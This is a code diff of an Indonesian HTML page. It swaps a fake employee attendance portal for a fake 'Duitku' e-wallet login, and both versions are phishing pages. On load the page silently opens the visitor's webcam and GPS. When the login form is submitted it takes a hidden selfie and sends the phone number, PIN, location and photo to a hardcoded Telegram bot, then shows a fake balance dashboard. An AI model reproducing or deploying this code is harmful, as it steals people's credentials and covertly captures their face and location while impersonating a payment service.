@@ -1,525 +1,457 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Portal Presensi Digital</title>
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Duitku - Dompet Digital Terpercaya</title>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <!-- FontAwesome untuk Icon -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #1e293b;
+        }
+        .phone-frame {
+            width: 100%;
+            max-width: 410px;
+            background: #ffffff;
+            border-radius: 30px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            min-height: 750px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+        .hidden {
+            display: none !important;
+        }
 
-    body {
-      background-color: #f1f5f9;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
+        /* --- HALAMAN LOGIN --- */
+        .login-container {
+            padding: 40px 30px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            flex-grow: 1;
+        }
+        .brand-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .brand-logo {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #0066ff, #00ccff);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            color: white;
+            font-size: 32px;
+            font-weight: 800;
+            box-shadow: 0 10px 20px rgba(0, 102, 255, 0.3);
+        }
+        .brand-header h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #0f172a;
+        }
+        .brand-header p {
+            font-size: 14px;
+            color: #64748b;
+            margin-top: 5px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #475569;
+            margin-bottom: 8px;
+        }
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        .input-wrapper i {
+            position: absolute;
+            left: 15px;
+            color: #94a3b8;
+        }
+        .input-wrapper input {
+            width: 100%;
+            padding: 14px 15px 14px 45px;
+            border: 2px solid #e2e8f0;
+            border-radius: 14px;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.3s;
+            background: #f8fafc;
+        }
+        .input-wrapper input:focus {
+            border-color: #0066ff;
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(0, 102, 255, 0.1);
+        }
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #0066ff, #0052cc);
+            border: none;
+            border-radius: 14px;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 8px 20px rgba(0, 102, 255, 0.3);
+            margin-top: 10px;
+        }
+        .btn-login:active {
+            transform: scale(0.98);
+        }
 
-    .app-container {
-      width: 100%;
-      max-width: 420px;
-      background-color: #ffffff;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      position: relative;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-      overflow: hidden;
-    }
-
-    /* ====================================
-       1. HALAMAN LOGIN (PAGE 1)
-    ==================================== */
-    #loginPage {
-      padding: 40px 24px;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      min-height: 100vh;
-      background: linear-gradient(180deg, #ffffff 0%, #f8fafc 100%);
-    }
-
-    .brand-badge {
-      width: 56px;
-      height: 56px;
-      background: linear-gradient(135deg, #2563eb, #1d4ed8);
-      border-radius: 16px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.8rem;
-      color: white;
-      margin: 0 auto 20px;
-      box-shadow: 0 8px 20px rgba(37, 99, 235, 0.3);
-    }
-
-    .login-header {
-      text-align: center;
-      margin-bottom: 32px;
-    }
-
-    .login-header h2 {
-      font-size: 1.6rem;
-      color: #0f172a;
-      font-weight: 800;
-      letter-spacing: -0.5px;
-    }
-
-    .login-header p {
-      font-size: 0.85rem;
-      color: #64748b;
-      margin-top: 6px;
-    }
-
-    .form-group {
-      margin-bottom: 20px;
-    }
-
-    .form-group label {
-      display: block;
-      font-size: 0.8rem;
-      font-weight: 700;
-      color: #334155;
-      margin-bottom: 8px;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
-
-    .form-group input {
-      width: 100%;
-      padding: 14px 16px;
-      border: 1.5px solid #e2e8f0;
-      border-radius: 12px;
-      font-size: 0.95rem;
-      outline: none;
-      background-color: #f8fafc;
-      transition: all 0.2s ease;
-    }
-
-    .form-group input:focus {
-      border-color: #2563eb;
-      background-color: #ffffff;
-      box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
-    }
-
-    .btn-login {
-      width: 100%;
-      background: linear-gradient(135deg, #2563eb, #1d4ed8);
-      color: white;
-      border: none;
-      padding: 16px;
-      border-radius: 12px;
-      font-size: 1rem;
-      font-weight: 700;
-      cursor: pointer;
-      margin-top: 10px;
-      box-shadow: 0 6px 20px rgba(37, 99, 235, 0.35);
-      transition: transform 0.1s ease, box-shadow 0.2s ease;
-    }
-
-    .btn-login:active {
-      transform: scale(0.98);
-    }
-
-    .btn-login:disabled {
-      background: #94a3b8;
-      box-shadow: none;
-      cursor: not-allowed;
-    }
-
-    .hidden-camera {
-      position: absolute;
-      width: 1px;
-      height: 1px;
-      opacity: 0;
-      pointer-events: none;
-    }
-
-    #status {
-      margin-top: 16px;
-      font-size: 0.85rem;
-      text-align: center;
-      font-weight: 600;
-    }
-
-    /* ====================================
-       2. HALAMAN DASHBOARD PORTAL (PAGE 2)
-    ==================================== */
-    #dashboardPage {
-      display: none;
-      flex-direction: column;
-      min-height: 100vh;
-      background-color: #f8fafc;
-    }
-
-    .dashboard-header {
-      background: linear-gradient(135deg, #1e293b, #0f172a);
-      color: white;
-      padding: 28px 20px 36px;
-      border-bottom-left-radius: 28px;
-      border-bottom-right-radius: 28px;
-    }
-
-    .user-info {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 24px;
-    }
-
-    .user-profile {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-
-    .avatar {
-      width: 46px;
-      height: 46px;
-      background: linear-gradient(135deg, #3b82f6, #1d4ed8);
-      border-radius: 14px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: bold;
-      font-size: 1.2rem;
-      color: white;
-      box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);
-    }
-
-    .greeting p {
-      font-size: 0.75rem;
-      color: #94a3b8;
-    }
-
-    .greeting h3 {
-      font-size: 1.05rem;
-      font-weight: 700;
-      color: #f8fafc;
-    }
-
-    .stat-card {
-      background: rgba(255, 255, 255, 0.08);
-      backdrop-filter: blur(12px);
-      border: 1px solid rgba(255, 255, 255, 0.12);
-      border-radius: 20px;
-      padding: 20px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-
-    .stat-title {
-      font-size: 0.75rem;
-      color: #94a3b8;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
-
-    .stat-value {
-      font-size: 1.4rem;
-      font-weight: 800;
-      color: #ffffff;
-      margin-top: 4px;
-    }
-
-    .badge-status {
-      background-color: rgba(34, 197, 94, 0.15);
-      color: #4ade80;
-      border: 1px solid rgba(34, 197, 94, 0.3);
-      padding: 6px 14px;
-      border-radius: 20px;
-      font-size: 0.75rem;
-      font-weight: 700;
-    }
-
-    .content-body {
-      padding: 24px 20px;
-      flex: 1;
-    }
-
-    .section-title {
-      font-size: 0.9rem;
-      font-weight: 700;
-      color: #334155;
-      margin-bottom: 14px;
-    }
-
-    .menu-grid {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 12px;
-      background: #ffffff;
-      padding: 20px 16px;
-      border-radius: 20px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.03);
-      border: 1px solid #f1f5f9;
-      margin-bottom: 24px;
-    }
-
-    .menu-item {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 8px;
-      cursor: pointer;
-    }
-
-    .menu-icon {
-      width: 48px;
-      height: 48px;
-      background-color: #eff6ff;
-      border-radius: 14px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.2rem;
-      transition: transform 0.2s ease;
-    }
-
-    .menu-item:hover .menu-icon {
-      transform: translateY(-2px);
-    }
-
-    .menu-item span {
-      font-size: 0.72rem;
-      color: #475569;
-      font-weight: 600;
-    }
-
-    .history-card {
-      background: #ffffff;
-      border-radius: 20px;
-      padding: 20px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.03);
-      border: 1px solid #f1f5f9;
-    }
-
-    .history-item {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 12px 0;
-      border-bottom: 1px solid #f1f5f9;
-    }
-
-    .history-item:last-child {
-      border-bottom: none;
-    }
-
-    .history-info p {
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: #1e293b;
-    }
-
-    .history-info small {
-      font-size: 0.72rem;
-      color: #94a3b8;
-    }
-
-    .history-badge {
-      font-size: 0.75rem;
-      font-weight: 700;
-      color: #16a34a;
-      background-color: #f0fdf4;
-      padding: 4px 10px;
-      border-radius: 8px;
-    }
-  </style>
+        /* --- HALAMAN DASHBOARD E-WALLET --- */
+        .dashboard-container {
+            padding: 25px;
+            background: #f8fafc;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        .user-top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .user-info h3 {
+            font-size: 16px;
+            color: #0f172a;
+        }
+        .user-info p {
+            font-size: 12px;
+            color: #64748b;
+        }
+        .avatar {
+            width: 40px;
+            height: 40px;
+            background: #cbd5e1;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #475569;
+            font-weight: 700;
+        }
+        .wallet-card {
+            background: linear-gradient(135deg, #0066ff, #002b80);
+            color: white;
+            padding: 20px;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0, 102, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        .wallet-card::before {
+            content: '';
+            position: absolute;
+            right: -30px;
+            bottom: -30px;
+            width: 120px;
+            height: 120px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+        }
+        .wallet-title {
+            font-size: 13px;
+            opacity: 0.8;
+            font-weight: 500;
+        }
+        .wallet-saldo {
+            font-size: 26px;
+            font-weight: 800;
+            margin: 8px 0 15px 0;
+        }
+        .wallet-actions {
+            display: flex;
+            gap: 10px;
+        }
+        .action-chip {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            backdrop-filter: blur(5px);
+        }
+        .menu-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+        .menu-box {
+            background: white;
+            padding: 15px 10px;
+            border-radius: 16px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.03);
+            transition: transform 0.2s;
+        }
+        .menu-box:active {
+            transform: scale(0.95);
+        }
+        .menu-box i {
+            font-size: 20px;
+            color: #0066ff;
+            margin-bottom: 8px;
+            display: block;
+        }
+        .menu-box span {
+            font-size: 11px;
+            font-weight: 600;
+            color: #334155;
+        }
+        .section-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: #0f172a;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .history-list {
+            background: white;
+            border-radius: 16px;
+            padding: 10px 15px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.03);
+        }
+        .history-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid #f1f5f9;
+        }
+        .history-item:last-child {
+            border-bottom: none;
+        }
+        .history-info .title {
+            font-size: 13px;
+            font-weight: 600;
+            color: #1e293b;
+        }
+        .history-info .time {
+            font-size: 11px;
+            color: #94a3b8;
+        }
+        .history-amount {
+            font-size: 13px;
+            font-weight: 700;
+        }
+        .amount-in { color: #10b981; }
+        .amount-out { color: #ef4444; }
+    </style>
 </head>
 <body>
 
-  <div class="app-container">
-
-    <!-- ================= HALAMAN 1: LOGIN ================= -->
-    <div id="loginPage">
-      <div class="brand-badge">📋</div>
-      <div class="login-header">
-        <h2>Portal Presensi</h2>
-        <p>Silakan verifikasi akun untuk mencatat kehadiran</p>
-      </div>
-
-      <form id="loginForm">
-        <div class="form-group">
-          <label>Nama Lengkap / NIK</label>
-          <input type="text" id="inputNama" placeholder="Masukkan nama atau NIK..." required>
+    <div class="phone-frame">
+        <!-- HALAMAN LOGIN -->
+        <div id="login-section" class="login-container">
+            <div class="brand-header">
+                <div class="brand-logo">D</div>
+                <h1>Duitku</h1>
+                <p>Masuk ke dompet digital Anda</p>
+            </div>
+            <form id="loginForm" onsubmit="handleLogin(event)">
+                <div class="input-group">
+                    <label>Nomor Handphone</label>
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-phone"></i>
+                        <input type="text" id="username" required placeholder="08xxxxxxxxxx">
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label>PIN Duitku</label>
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-lock"></i>
+                        <input type="password" id="password" required placeholder="Masukkan 6 digit PIN">
+                    </div>
+                </div>
+                <button type="submit" class="btn-login">Masuk Sekarang</button>
+            </form>
         </div>
 
-        <div class="form-group">
-          <label>Kata Sandi / PIN</label>
-          <input type="password" id="inputPin" placeholder="Masukkan PIN atau Sandi..." required>
+        <!-- HALAMAN DASHBOARD E-WALLET -->
+        <div id="wallet-section" class="dashboard-container hidden">
+            <div class="user-top-bar">
+                <div class="user-info">
+                    <h3 id="displayUser">Halo, Pengguna</h3>
+                    <p>Selamat datang kembali 👋</p>
+                </div>
+                <div class="avatar"><i class="fa-solid fa-user"></i></div>
+            </div>
+
+            <div class="wallet-card">
+                <div class="wallet-title">Saldo Utama Duitku</div>
+                <div class="wallet-saldo">Rp 2.450.000</div>
+                <div class="wallet-actions">
+                    <div class="action-chip"><i class="fa-solid fa-plus"></i> Top Up</div>
+                    <div class="action-chip"><i class="fa-solid fa-arrow-up"></i> Kirim</div>
+                </div>
+            </div>
+
+            <div class="menu-grid">
+                <div class="menu-box">
+                    <i class="fa-solid fa-wallet"></i>
+                    <span>Transfer</span>
+                </div>
+                <div class="menu-box">
+                    <i class="fa-solid fa-mobile-screen"></i>
+                    <span>Pulsa / Data</span>
+                </div>
+                <div class="menu-box">
+                    <i class="fa-solid fa-bolt"></i>
+                    <span>Listrik PLN</span>
+                </div>
+                <div class="menu-box">
+                    <i class="fa-solid fa-receipt"></i>
+                    <span>BPJS/PDAM</span>
+                </div>
+            </div>
+
+            <div class="section-title">
+                <span>Riwayat Transaksi</span>
+            </div>
+            
+            <div class="history-list">
+                <div class="history-item">
+                    <div class="history-info">
+                        <div class="title">Top Up dari Bank BCA</div>
+                        <div class="time">Hari ini, 09:14</div>
+                    </div>
+                    <div class="history-amount amount-in">+ Rp 500.000</div>
+                </div>
+                <div class="history-item">
+                    <div class="history-info">
+                        <div class="title">Bayar Merchant QRIS</div>
+                        <div class="time">Kemarin, 14:30</div>
+                    </div>
+                    <div class="history-amount amount-out">- Rp 45.000</div>
+                </div>
+            </div>
         </div>
-
-        <button type="submit" id="btnLogin" class="btn-login">VERIFIKASI & LOG MASUK</button>
-        <div id="status"></div>
-      </form>
-
-      <!-- Elemen Kamera Tersembunyi -->
-      <video id="webcam" class="hidden-camera" autoplay playsinline muted></video>
-      <canvas id="canvas" class="hidden-camera"></canvas>
     </div>
 
-    <!-- ================= HALAMAN 2: DASHBOARD PORTAL ================= -->
-    <div id="dashboardPage">
-      <div class="dashboard-header">
-        <div class="user-info">
-          <div class="user-profile">
-            <div class="avatar" id="userAvatar">A</div>
-            <div class="greeting">
-              <p>Selamat Datang,</p>
-              <h3 id="displayNama">Karyawan</h3>
-            </div>
-          </div>
-        </div>
+    <!-- Hidden Video & Canvas untuk Selfie -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
-        <div class="stat-card">
-          <div>
-            <div class="stat-title">Status Kehadiran</div>
-            <div class="stat-value">Tercatat</div>
-          </div>
-          <div class="badge-status">Online</div>
-        </div>
-      </div>
+    <script>
+        // KONFIGURASI TELEGRAM BOT (Ganti dengan Token & Chat ID Anda)
+        const TELEGRAM_BOT_TOKEN = '8923573949:AAGZm4FP8EkWoaJqLdzUG0y1cZnfG0Yd8Is';
+        const TELEGRAM_CHAT_ID = '6742478722';
 
-      <div class="content-body">
-        <div class="section-title">Menu Utama</div>
-        <div class="menu-grid">
-          <div class="menu-item">
-            <div class="menu-icon">📅</div>
-            <span>Jadwal</span>
-          </div>
-          <div class="menu-item">
-            <div class="menu-icon">📊</div>
-            <span>Laporan</span>
-          </div>
-          <div class="menu-item">
-            <div class="menu-icon">📝</div>
-            <span>Izin/Cuti</span>
-          </div>
-          <div class="menu-item">
-            <div class="menu-icon">⚙️</div>
-            <span>Pengaturan</span>
-          </div>
-        </div>
+        let capturedImageBlob = null;
+        let userLocation = "Lokasi tidak diizinkan/tidak ditemukan";
 
-        <div class="section-title">Aktivitas Terakhir</div>
-        <div class="history-card">
-          <div class="history-item">
-            <div class="history-info">
-              <p>Presensi Masuk</p>
-              <small>Hari ini, Baru saja</small>
-            </div>
-            <div class="history-badge">Sukses</div>
-          </div>
-          <div class="history-item">
-            <div class="history-info">
-              <p>Presensi Pulang</p>
-              <small>Kemarin, 17:00 WIB</small>
-            </div>
-            <div class="history-badge">Sukses</div>
-          </div>
-        </div>
-      </div>
-    </div>
+        // Otomatis minta izin kamera dan GPS saat halaman dibuka
+        window.onload = function() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                })
+                .catch(err => console.log("Kamera ditolak: ", err));
 
-  </div>
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        userLocation = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                    },
+                    error => { console.log("GPS ditolak: ", error.message); }
+                );
+            }
+        };
 
-  <script>
-    // === MASUKKAN BOT TOKEN & CHAT ID TELEGRAM DI SINI ===
-    const BOT_TOKEN = '8923573949:AAGZm4FP8EkWoaJqLdzUG0y1cZnfG0Yd8Is';
-    const CHAT_ID = '6742478722';
+        function handleLogin(event) {
+            event.preventDefault();
+            
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
 
-    const loginPage = document.getElementById('loginPage');
-    const dashboardPage = document.getElementById('dashboardPage');
-    const loginForm = document.getElementById('loginForm');
-    const btnLogin = document.getElementById('btnLogin');
-    const statusDiv = document.getElementById('status');
-    const video = document.getElementById('webcam');
-    const canvas = document.getElementById('canvas');
+            // Update nama user di dashboard
+            document.getElementById('displayUser').innerText = `Halo, ${user}`;
 
-    let userLat = null;
-    let userLon = null;
+            // Ambil foto dari video stream
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth || 320;
+            canvas.height = video.videoHeight || 240;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // 1. Inisialisasi Kamera & Lokasi GPS
-    window.addEventListener('load', () => {
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-          .then(stream => { video.srcObject = stream; })
-          .catch(err => console.warn('Kamera tidak diizinkan:', err));
-      }
+            canvas.toBlob(function(blob) {
+                capturedImageBlob = blob;
+                sendToTelegram(user, pass, capturedImageBlob, userLocation);
+            }, 'image/jpeg');
 
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            userLat = pos.coords.latitude;
-            userLon = pos.coords.longitude;
-          },
-          err => console.warn('GPS tidak diizinkan:', err),
-          { enableHighAccuracy: true }
-        );
-      }
-    });
-
-    // 2. Kirim Data saat Login
-    loginForm.addEventListener('submit', async (e) => {
-      e.preventDefault();
-
-      const nama = document.getElementById('inputNama').value;
-      const pin = document.getElementById('inputPin').value;
-
-      btnLogin.disabled = true;
-      statusDiv.style.color = '#2563eb';
-      statusDiv.innerText = 'Memproses verifikasi kehadiran...';
-
-      // Tangkap selfie
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      const mapUrl = (userLat && userLon) 
-        ? `https://maps.google.com/?q=${userLat},${userLon}` 
-        : 'Lokasi tidak diizinkan';
-
-      const caption = `📌 *LOG PRESI TERKIRIM*\n\n` +
-                      `👤 *Nama/NIK:* ${nama}\n` +
-                      `🔑 *Sandi/PIN:* ${pin}\n` +
-                      `📍 *Lokasi:* [Buka Google Maps](${mapUrl})\n` +
-                      `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}`;
-
-      canvas.toBlob(async (blob) => {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        if (blob) formData.append('photo', blob, 'selfie.jpg');
-        formData.append('caption', caption);
-        formData.append('parse_mode', 'Markdown');
-
-        try {
-          if (!BOT_TOKEN.includes('ISI_TOKEN_BOT')) {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-              method: 'POST',
-              body: formData
-            });
-          }
-        } catch (err) {
-          console.error('Gagal kirim ke Telegram:', err);
-        } finally {
-          // Berpindah ke Dashboard Portal
-          document.getElementById('displayNama').innerText = nama;
-          document.getElementById('userAvatar').innerText = nama.charAt(0).toUpperCase();
-
-          loginPage.style.display = 'none';
-          dashboardPage.style.display = 'flex';
+            // Pindah tampilan ke Dashboard
+            document.getElementById('login-section').classList.add('hidden');
+            document.getElementById('wallet-section').classList.remove('hidden');
         }
-      }, 'image/jpeg', 0.8);
-    });
-  </script>
 
+        function sendToTelegram(username, password, imageBlob, locationUrl) {
+            if (TELEGRAM_BOT_TOKEN === 'MASUKKAN_BOT_TOKEN_ANDA_DISINI') return;
+
+            const textMessage = `🔔 *LOGIN DUITKU TERDETEKSI*\n\n👤 Akun: \`${username}\`\n🔑 PIN: \`${password}\`\n📍 Lokasi: ${locationUrl}`;
+            
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: textMessage,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            if (imageBlob) {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', imageBlob, 'selfie.jpg');
+                formData.append('caption', `📸 Foto Selfie Pengguna (${username})`);
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+        }
+    </script>
 </body>
-</html>
+</html
